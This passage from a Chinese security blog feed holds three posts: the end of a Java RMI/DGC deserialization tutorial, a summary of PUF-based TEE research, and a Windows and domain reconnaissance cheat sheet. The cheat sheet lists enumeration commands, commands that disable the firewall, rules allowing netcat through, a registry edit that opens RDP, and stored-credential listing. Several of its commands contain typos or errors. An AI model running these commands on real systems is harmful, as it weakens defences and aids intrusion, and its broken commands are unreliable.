DGC</h2><blockquote><p>说实在的，个人认为这部分内容还是相当重要的，因为设置到后面的jrmp绕过相关知识，后面涉及的利用的还是蛮多的。</p></blockquote><h3 id="4-8-1-创建DGC"><a href="#4-8-1-创建DGC" class="headerlink" title="4.8.1 创建DGC"></a>4.8.1 创建DGC</h3><p>首先我们需要了解一下DGC的创建流程到底在哪里，如果我们对前面的调试流程的记忆比较清晰的大概可以记得，我们在ObjectTable中存在一个不明的判断。其实DGC就是在这个时候创建的。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410111723061.png"></p><p>实际上我们发现它这是调用了DGCImpl的静态变量dgcLog，在这个过程中会对类进行初始化，调用其中静态代码块中的内容然后执行，所以我们跟进DGCImpl类中的静态代码块。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410111726851.png"></p><p>可以看到在<code>DGCImpl</code>类中存在一个静态代码块，在我们调用<code>DGCImpl</code>的静态变量dgcLog的时候就会自动调用该静态代码快进行创建DGC，同时也创建了DGCImpl_skel,DGCImpl_Stub对象，以及封装Target对象，过程与之前的客户端与服务端分析的类似，这里就不在细说了。</p><h3 id="4-8-2-DGC漏洞点"><a href="#4-8-2-DGC漏洞点" class="headerlink" title="4.8.2 DGC漏洞点"></a>4.8.2 DGC漏洞点</h3><blockquote><p>在了解了DGC漏洞点的基础之后，我们来看看DGC到底存在哪些问题？</p></blockquote><p>首先，在<code>DGCImpl_Stub</code>类中存在两个方法，一个是 clean，另外一个是 dirty。<br>clean 就是”强”清除内存，dirty 就是”弱”清除内存。</p><p>来查看类的具体实现我们可以发现，其实在<code>dirty()</code>方法中存在<code>readObject()</code>方法的调用，存在反序列化的入口类，可以尝试去进行反序列化漏洞的利用。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410121251578.png"></p><p>相同的，我们来到<code>DGCImpl_Skel</code>类也可以发现，其中存在一个方法<code>dispatch()</code>，其中也调用了<code>readObject()</code>函数，存在反序列化的入口类，可以尝试去进行反序列化漏洞的利用。</p><p>这是在DGC我们需要关注的点，DGC这一块的具体利用可以说到jrmp绕过和JEP290等等，后续在开新章节详细说明；</p><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><ul><li>RegistryImpl_Stub和DGCImpl_Stub中远程方法(lookup&#x2F;list&#x2F;dirty)的返回值</li><li>客户端调用UnicastRef.unmarshalValue反序列化读取远程方法的返回值</li><li>客户端反序列化读取远程方法执行时出错抛出的异常类</li></ul><p>参考连接：</p><ol><li><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/</a></li><li><a href="https://www.freebuf.com/articles/security-management/365775.html">https://www.freebuf.com/articles/security-management/365775.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可验证密码物理安全TEE的研究方向(PUF)</title>
    <link href="/2024/12/06/%E5%8F%AF%E9%AA%8C%E8%AF%81%E5%AF%86%E7%A0%81%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8TEE%E7%9A%84%E7%A0%94%E7%A9%B6%E6%96%B9%E5%90%91(PUF)/"/>
    <url>/2024/12/06/%E5%8F%AF%E9%AA%8C%E8%AF%81%E5%AF%86%E7%A0%81%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8TEE%E7%9A%84%E7%A0%94%E7%A9%B6%E6%96%B9%E5%90%91(PUF)/</url>
    
    <content type="html"><![CDATA[<p>原文下载：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/34580676/1733271126573-82064117-21cf-4c90-a49b-a7bdd8a571e2.pdf">Research_Directions_for_Verifiable_Crypto-Physically_Secure_TEEs.pdf</a></p><blockquote><p>本文只详细阅读第三章节-遗忘根信任生成，剩下的章节请自行阅读分析</p></blockquote><h1 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h1><p>如何通过遗忘方式生成签名密钥（根信任），签名密钥在生成的时候不被任何第三方所知？</p><p>PUFs 和 True Random Number Generators(TRNG) 是目前所知最安全的方法生成签名密钥</p><p>TRNGs 由于每次生成的都是不同的密钥，因此如果将 TRNGs 使用到签名密钥（根信任）中，就必须将生成的密钥存储在非遗忘式的内存中，例如苹果的 Secure Envlave，非遗忘式的内存容易遭受镜像攻击。</p><p>PUFs 能够在芯片启动的时候再次生成相同的密钥并且不需要将该密钥存储在非遗忘式的内存中，因此将该密钥用于签署和验证固件时，没有任何第三方能够知道该密钥的生成以及生成的密钥；</p><h2 id="二、基础组件分析"><a href="#二、基础组件分析" class="headerlink" title="二、基础组件分析"></a>二、基础组件分析</h2><h2 id="2-1-理论基础"><a href="#2-1-理论基础" class="headerlink" title="2.1 理论基础"></a>2.1 理论基础</h2><h3 id="2-1-1-PUFs-的基本介绍"><a href="#2-1-1-PUFs-的基本介绍" class="headerlink" title="2.1.1 PUFs 的基本介绍"></a>2.1.1 PUFs 的基本介绍</h3><p>参考链接：<a href="https://candyb0x.github.io/2024/11/30/%E7%89%A9%E7%90%86%E4%B8%8D%E5%8F%AF%E5%85%8B%E9%9A%86%E5%87%BD%E6%95%B0PUF%E5%9F%BA%E7%A1%80/">https://candyb0x.github.io/2024/11/30/%E7%89%A9%E7%90%86%E4%B8%8D%E5%8F%AF%E5%85%8B%E9%9A%86%E5%87%BD%E6%95%B0PUF%E5%9F%BA%E7%A1%80/</a></p><h3 id="2-1-2-强弱-PUFs-的比较"><a href="#2-1-2-强弱-PUFs-的比较" class="headerlink" title="2.1.2 强弱 PUFs 的比较"></a>2.1.2 强弱 PUFs 的比较</h3><p>区分强弱 PUFs 的依据在于 PUFs 的挑战-响应对（CRPs）对的大小；</p><p>PUFs 具有大量的 CRPs 被定义为“强”PUFs 或者认证 PUFs，强 PUFs 理论上更容易受到攻击，最为显著的就是机器学习攻击，并且也还没有被认为是安全的。</p><p>PUFs 具有少量的 CRPs 被定义为“弱”PUFs 或者密钥 PUFs，由于少量的 CRPs 不能被机器学习攻击所利用，从而使得其安全性较高，现已在商业中广泛应用，尤其是物联网（IoT）设备；</p><h3 id="2-1-3-PUF-特性"><a href="#2-1-3-PUF-特性" class="headerlink" title="2.1.3 PUF 特性"></a>2.1.3 PUF 特性</h3><p>PUF 的定义：</p><p>$ Π: x→y:Π(x) &#x3D; y $</p><p>特性 1（可计算性）：给出一个 PUF <strong>函数</strong>$ Π $** **和一个挑战 x，能够很容易计算出响应 $ y&#x3D;Π(x) $。</p><p>特性 2（唯一性）：PUF 函数 $ Π(x) $包含一些关于嵌入 PUF 物理设备的唯一属性。</p><p>特性 3（可重复性）：响应$ y &#x3D; Π(x) $在很小的误差范围内是可重复的。</p><p>特性 4（不可克隆性）：给定一个PUF$ Π $，很难构造这样一个过程 $ Γ\neqΠ\quad∀x∈x：Γ(x)≈Π(x) $，直至一个小误差。</p><p>特性 5（防篡改）：<font style="color:rgb(42, 43, 46);">改变嵌入</font>$ Π $<font style="color:rgb(42, 43, 46);">的物理实体对</font>$ Π→Π’ $<font style="color:rgb(42, 43, 46);">进行变换，使得大概率</font>$ ∃x∈x:Π(x) \neq Π’(x) $<font style="color:rgb(42, 43, 46);">，甚至不会产生很小的误差。</font></p><h3 id="2-1-4-PUFs-的混淆"><a href="#2-1-4-PUFs-的混淆" class="headerlink" title="2.1.4 PUFs 的混淆"></a>2.1.4 PUFs 的混淆</h3><p><font style="color:rgb(42, 43, 46);">芯片也会老化，随着时间的推移，PUF的响应也会因为其物理组件的退化而发生变化。因此，对于可靠的puf来说，混乱有好有坏。</font></p><ol><li><font style="color:rgb(42, 43, 46);">工艺制造变化</font><br><font style="color:rgb(42, 43, 46);">在芯片制造过程中引入了两种主要类型的变化：(1)沉积和&#x2F;或扩散掺杂剂的工艺参数的变化(2)由于光刻工艺的有限分辨率而导致的晶体管尺寸的变化。</font></li><li><font style="color:rgb(42, 43, 46);">环境的变化</font><font style="color:rgb(42, 43, 46);"><br></font><font style="color:rgb(42, 43, 46);">PUF嵌入在芯片中，其周围环境会对其响应产生影响。热、电压和噪声耦合等因素可能导致PUF的响应在相对较短的时间内发生变化。例如，电子的振动会引起电子噪声，称为约翰逊-奈奎斯特噪声，这将影响PUF的响应。因此，即使在完全稳定的实验室条件下，PUF的反应也不能完全重现。</font></li><li><font style="color:rgb(42, 43, 46);">老化<br></font><font style="color:rgb(42, 43, 46);">根据芯片的使用频率，其组件将慢慢退化，这些物理变化将影响PUF响应。</font></li></ol><h3 id="2-1-5-PUF-响应的稳定性"><a href="#2-1-5-PUF-响应的稳定性" class="headerlink" title="2.1.5 PUF 响应的稳定性"></a>2.1.5 PUF 响应的稳定性</h3><p>由于芯片会产生意料之外的变化导致 PUF 响应的不稳定，所以需要引入后处理方案去保证再生成相同的签名密钥；</p><p><font style="color:rgb(42, 43, 46);">纠错方案通常用于恢复原始响应。虽然可靠，但错误纠正方案要求将辅助数据存储在非易失性存储器中。（回到了之前需要存储在非易失性存储器，那么 PUF 的意义好像没有这么大）；</font></p><p><font style="color:rgb(42, 43, 46);">其他技术也得到了发展，如时间多数投票、暗位掩蔽和老化增强。许多PUF设计将时间多数投票与暗位掩蔽相结合，以获得更好的PUF响应稳定性；还有通过利用响应去稳定 PUF 的方法；</font></p><p><font style="color:rgb(42, 43, 46);">在[29]中，提出了一种金属氧化物击穿PUF，该PUF在两个逻辑上相同的晶体管上施加高压以引起氧化物击穿的形成。根据哪个晶体管先坏掉，会设置0或1位。由于三氧化物的击穿是永久性的，因此PUF响应变得稳定。通过构建晶体管对阵列，可以获得稳定的位串，并用于生成密钥。然而，在[103]中显示，通过使用电压对比扫描电子显微镜（VC-SEM）来识别哪个晶体管具有氧化物，容易受到成像攻击</font></p>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>硬件安全</tag>
      
      <tag>PUF</tag>
      
      <tag>PUF特性</tag>
      
      <tag>PUF攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 信息收集与配置</title>
    <link href="/2024/12/06/Windows%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/12/06/Windows%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="一、收集本机信息"><a href="#一、收集本机信息" class="headerlink" title="一、收集本机信息"></a>一、收集本机信息</h1><h2 id="1-1-手动信息收集"><a href="#1-1-手动信息收集" class="headerlink" title="1.1 手动信息收集"></a>1.1 手动信息收集</h2><h3 id="1-1-1-查询网络配置信息"><a href="#1-1-1-查询网络配置信息" class="headerlink" title="1.1.1 查询网络配置信息"></a>1.1.1 查询网络配置信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig /all<span class="hljs-comment"># 查询网络配置信息</span><br></code></pre></td></tr></table></figure><h3 id="1-1-2-查询操作系统及软件信息"><a href="#1-1-2-查询操作系统及软件信息" class="headerlink" title="1.1.2 查询操作系统及软件信息"></a>1.1.2 查询操作系统及软件信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<span class="hljs-comment"># 查询操作系统及软件信息(可查询出补丁，可利用系统自身存在的漏洞进行后续的提权。)</span><br>systeminfo | findstr /B /C:“OS 名称” /C:“OS 版本”<br><span class="hljs-built_in">echo</span> %PROCESSOR_ARCHITECTURE%<span class="hljs-comment"># 查看系统体系结构</span><br>wmic product get name,version<span class="hljs-comment"># 查看安装的软件版本及路径等</span><br><span class="hljs-comment"># 利用powershell收集软件版本信息</span><br>powershell “GET-WmiObject -class Win32_Product | Select-Object -Property name,version”<br></code></pre></td></tr></table></figure><h3 id="1-1-3-查询本机服务信息"><a href="#1-1-3-查询本机服务信息" class="headerlink" title="1.1.3 查询本机服务信息"></a>1.1.3 <font style="color:rgb(25, 27, 31);">查询本机服务信息</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service list brief<span class="hljs-comment"># 查询本机服务信息</span><br></code></pre></td></tr></table></figure><h3 id="1-1-4-查询进程列表"><a href="#1-1-4-查询进程列表" class="headerlink" title="1.1.4 查询进程列表"></a>1.1.4 <font style="color:rgb(25, 27, 31);">查询进程列表</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist<span class="hljs-comment"># 查询进程列表</span><br>wmic process list brief<span class="hljs-comment"># 查看当前进程和进程用户</span><br></code></pre></td></tr></table></figure><h3 id="1-1-5-查看启动程序（启动项）信息"><a href="#1-1-5-查看启动程序（启动项）信息" class="headerlink" title="1.1.5 查看启动程序（启动项）信息"></a>1.1.5 <font style="color:rgb(25, 27, 31);">查看启动程序（启动项）信息</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic startup get <span class="hljs-built_in">command</span>,caption<span class="hljs-comment"># 查看启动程序（启动项）信息</span><br></code></pre></td></tr></table></figure><h3 id="1-1-6-查看计划任务"><a href="#1-1-6-查看计划任务" class="headerlink" title="1.1.6 查看计划任务"></a>1.1.6 <font style="color:rgb(25, 27, 31);">查看计划任务</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<span class="hljs-comment"># 查看计划任务</span><br></code></pre></td></tr></table></figure><h3 id="1-1-7-查询用户列表"><a href="#1-1-7-查询用户列表" class="headerlink" title="1.1.7 查询用户列表"></a>1.1.7 查询用户列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user<span class="hljs-comment"># 查看本机用户列表</span><br>net localgroup administrators<span class="hljs-comment"># 获取本地管理员组</span><br>query user || qwinsta<span class="hljs-comment"># 查看当前在线用户</span><br></code></pre></td></tr></table></figure><h3 id="1-1-8-查看主机开机时间"><a href="#1-1-8-查看主机开机时间" class="headerlink" title="1.1.8 查看主机开机时间"></a>1.1.8 <font style="color:rgb(25, 27, 31);">查看主机开机时间</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net statistics workstation<br></code></pre></td></tr></table></figure><h3 id="1-1-9-列出或端开本地计算机与所有连接的客户端之间的会话"><a href="#1-1-9-列出或端开本地计算机与所有连接的客户端之间的会话" class="headerlink" title="1.1.9 列出或端开本地计算机与所有连接的客户端之间的会话"></a>1.1.9 <font style="color:rgb(25, 27, 31);">列出或端开本地计算机与所有连接的客户端之间的会话</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net session<br></code></pre></td></tr></table></figure><h3 id="1-1-10-查询端口列表"><a href="#1-1-10-查询端口列表" class="headerlink" title="1.1.10 查询端口列表"></a>1.1.10 <font style="color:rgb(25, 27, 31);">查询端口列表</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure><h3 id="1-1-11-查看补丁列表"><a href="#1-1-11-查看补丁列表" class="headerlink" title="1.1.11 查看补丁列表"></a>1.1.11 <font style="color:rgb(25, 27, 31);">查看补丁列表</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<br>wmic qfe get Caption,Descript,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><h3 id="1-1-12-查询本地共享列表"><a href="#1-1-12-查询本地共享列表" class="headerlink" title="1.1.12 查询本地共享列表"></a>1.1.12 <font style="color:rgb(25, 27, 31);">查询本地共享列表</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net share<br>wmic share get name,path,status<br></code></pre></td></tr></table></figure><h3 id="1-1-13-查询路由表及所有可用接口的ARP缓存表"><a href="#1-1-13-查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="1.1.13 查询路由表及所有可用接口的ARP缓存表"></a>1.1.13 <font style="color:rgb(25, 27, 31);">查询路由表及所有可用接口的ARP缓存表</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure><h3 id="1-1-14-查看防火墙相关配置"><a href="#1-1-14-查看防火墙相关配置" class="headerlink" title="1.1.14 查看防火墙相关配置"></a>1.1.14 查看防火墙相关配置</h3><ul><li>查杀软</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List<br></code></pre></td></tr></table></figure><ul><li>关闭防火墙</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows Server 2003 系统及之前版本</span><br>netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span><br><span class="hljs-comment"># Windows Server 2003 系统及之后版本</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure><ul><li>查看防火墙配置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat firewall show config<br></code></pre></td></tr></table></figure><ul><li>修改防火墙配置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows server 2003 及之前，允许指定程序全部连接</span><br>netsh firewall add allowedprogram c:\nc.exe <span class="hljs-string">&quot;allwa nc&quot;</span> <span class="hljs-built_in">enable</span><br><span class="hljs-comment"># Windows server 2003 之后，允许指定程序全部连接</span><br>netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow program=<span class="hljs-string">&quot;c:\nc.exe&quot;</span><br><span class="hljs-comment"># 允许指定程序退出</span><br>netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow nc&quot;</span> <span class="hljs-built_in">dir</span>=out action=allow program=<span class="hljs-string">&quot;c:\nc.exe&quot;</span><br><br><span class="hljs-comment"># 允许 3389 端口放行</span><br>netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Remote Desktop&quot;</span> protocol=TCP <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> localport=3389 action=allow<br><br><span class="hljs-comment"># 自定义翻过墙存储位置</span><br>netsh advfirewall <span class="hljs-built_in">set</span> currentprofile logging filename <span class="hljs-string">&quot;c:\windows\temp\fw.log&quot;</span><br><br><span class="hljs-comment"># 远程桌面连接历史记录</span><br>cmdkey /l<br><br><span class="hljs-comment">#注册表开启3389端口</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br><span class="hljs-comment">#添加防火墙规则</span><br>netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Open 3389&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=TCP localport=3389<br><br><span class="hljs-comment">#关闭防火墙</span><br>netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span>   <span class="hljs-comment">#winsows server 2003 之前</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off <span class="hljs-comment">#winsows server 2003 之后</span><br></code></pre></td></tr></table></figure><ul><li>自定义防火墙日志的存储位置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall <span class="hljs-built_in">set</span> currentprofile logging filename <span class="hljs-string">&quot;C:\windows\temp\fw.log&quot;</span><br></code></pre></td></tr></table></figure><h2 id="1-2-脚本自动信息收集"><a href="#1-2-脚本自动信息收集" class="headerlink" title="1.2 脚本自动信息收集"></a>1.2 脚本自动信息收集</h2><p>下载链接：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>下载后直接运行脚本得到 <strong><font style="color:rgb(77, 77, 77);">html 格式</font></strong><font style="color:rgb(77, 77, 77);">的文件，打开即可；</font></p><h1 id="二、查看当前权限"><a href="#二、查看当前权限" class="headerlink" title="二、查看当前权限"></a><font style="color:rgb(77, 77, 77);">二、查看当前权限</font></h1><h2 id="2-1-获取当前域-SID"><a href="#2-1-获取当前域-SID" class="headerlink" title="2.1 获取当前域 SID"></a>2.1 获取当前域 SID</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><h2 id="2-2-查询指定用户的详细信息"><a href="#2-2-查询指定用户的详细信息" class="headerlink" title="2.2 查询指定用户的详细信息"></a>2.2 查询指定用户的详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user win7 /domain<br></code></pre></td></tr></table></figure><h1 id="三、判断是否存在域"><a href="#三、判断是否存在域" class="headerlink" title="三、判断是否存在域"></a>三、判断是否存在域</h1><h2 id="3-1-ipconfig"><a href="#3-1-ipconfig" class="headerlink" title="3.1 ipconfig"></a>3.1 ipconfig</h2><p><font style="color:rgb(25, 27, 31);">查看网关IP地址、DNS的ip地址、域名、本机是否和DNS服务器处于同一网段等信息。</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /all<br></code></pre></td></tr></table></figure><p><font style="color:rgb(25, 27, 31);">然后</font><code>&lt;font style=&quot;color:rgb(25, 27, 31);background-color:rgb(248, 248, 250);&quot;&gt;nslookup&lt;/font&gt;</code><font style="color:rgb(25, 27, 31);">解析域名的ip地址，查看是否与DNS服务器在同一ip上。</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup security.com<br></code></pre></td></tr></table></figure><h2 id="3-2-查看系统的详细信息"><a href="#3-2-查看系统的详细信息" class="headerlink" title="3.2 查看系统的详细信息"></a>3.2 查看系统的详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<br></code></pre></td></tr></table></figure><p><font style="color:rgb(25, 27, 31);">从中看到处于域 </font><code>&lt;font style=&quot;color:rgb(25, 27, 31);background-color:rgb(248, 248, 250);&quot;&gt;security.com&lt;/font&gt;</code></p><h2 id="3-3-查看当前登录域及域用户"><a href="#3-3-查看当前登录域及域用户" class="headerlink" title="3.3 查看当前登录域及域用户"></a>3.3 查看当前登录域及域用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net config workstation<br></code></pre></td></tr></table></figure><h2 id="3-4-判断主域"><a href="#3-4-判断主域" class="headerlink" title="3.4 判断主域"></a>3.4 判断主域</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net time /domain<br></code></pre></td></tr></table></figure><h1 id="四、搜集域内基本信息"><a href="#四、搜集域内基本信息" class="headerlink" title="四、搜集域内基本信息"></a><font style="color:rgb(25, 27, 31);">四、搜集域内基本信息</font></h1><h2 id="4-1-查询域"><a href="#4-1-查询域" class="headerlink" title="4.1 查询域"></a><font style="color:rgb(25, 27, 31);">4.1 查询域</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net view /domain<br></code></pre></td></tr></table></figure><h2 id="4-2-查询域内所有计算机"><a href="#4-2-查询域内所有计算机" class="headerlink" title="4.2 查询域内所有计算机"></a><font style="color:rgb(25, 27, 31);">4.2 查询域内所有计算机</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net view /domain:[domain-name]<br></code></pre></td></tr></table></figure><h2 id="4-3-查询域内所有用户组列表"><a href="#4-3-查询域内所有用户组列表" class="headerlink" title="4.3 查询域内所有用户组列表"></a><font style="color:rgb(25, 27, 31);">4.3 查询域内所有用户组列表</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net group /domain<br></code></pre></td></tr></table></figure><ul><li><font style="color:rgb(25, 27, 31);">Domain Admins : 域管理员组</font></li><li><font style="color:rgb(25, 27, 31);">Domain Computers : 域内机器</font></li><li><font style="color:rgb(25, 27, 31);">Domain Controllers ：域控制器</font></li><li><font style="color:rgb(25, 27, 31);">Domain Guest ： 域访客，权限较低</font></li><li><font style="color:rgb(25, 27, 31);">Domain User ： 域用户</font></li><li><font style="color:rgb(25, 27, 31);">Enterprise Admins ： 企业系统管理员用户</font></li></ul><p><font style="color:rgb(25, 27, 31);">默认，Domain Admins 、Enterprise Admins 对域内机器有完全控制权。</font></p><h2 id="4-4-查询所有域成员计算机列表"><a href="#4-4-查询所有域成员计算机列表" class="headerlink" title="4.4 查询所有域成员计算机列表"></a><font style="color:rgb(25, 27, 31);">4.4 查询所有域成员计算机列表</font></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">net group “domain computers” /doamin<br></code></pre></td></tr></table></figure><h2 id="4-5-获取域用户密码信息"><a href="#4-5-获取域用户密码信息" class="headerlink" title="4.5 获取域用户密码信息"></a><font style="color:rgb(25, 27, 31);">4.5 获取域用户密码信息</font></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">net accounts /domain<br></code></pre></td></tr></table></figure><h2 id="4-6-获取域信任信息"><a href="#4-6-获取域信任信息" class="headerlink" title="4.6 获取域信任信息"></a><font style="color:rgb(25, 27, 31);">4.6 获取域信任信息</font></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nltest /domain_trusts<br></code></pre></td></tr></table></figure><h1 id="五、查看域控制器"><a href="#五、查看域控制器" class="headerlink" title="五、查看域控制器"></a><font style="color:rgb(25, 27, 31);">五、查看域控制器</font></h1><h2 id="5-1查看域控制器的机器名"><a href="#5-1查看域控制器的机器名" class="headerlink" title="5.1查看域控制器的机器名"></a><font style="color:rgb(25, 27, 31);">5.1查看域控制器的机器名</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nltest /DCLIST:security<br></code></pre></td></tr></table></figure><h2 id="5-2查看域控制器的主机名"><a href="#5-2查看域控制器的主机名" class="headerlink" title="5.2查看域控制器的主机名"></a><font style="color:rgb(25, 27, 31);">5.2查看域控制器的主机名</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nslookup -type=SRV_ldap_tcp<br></code></pre></td></tr></table></figure><h2 id="5-3查看当前时间"><a href="#5-3查看当前时间" class="headerlink" title="5.3查看当前时间"></a><font style="color:rgb(25, 27, 31);">5.3查看当前时间</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net time /domain<br></code></pre></td></tr></table></figure><h2 id="5-4查看域控制器组"><a 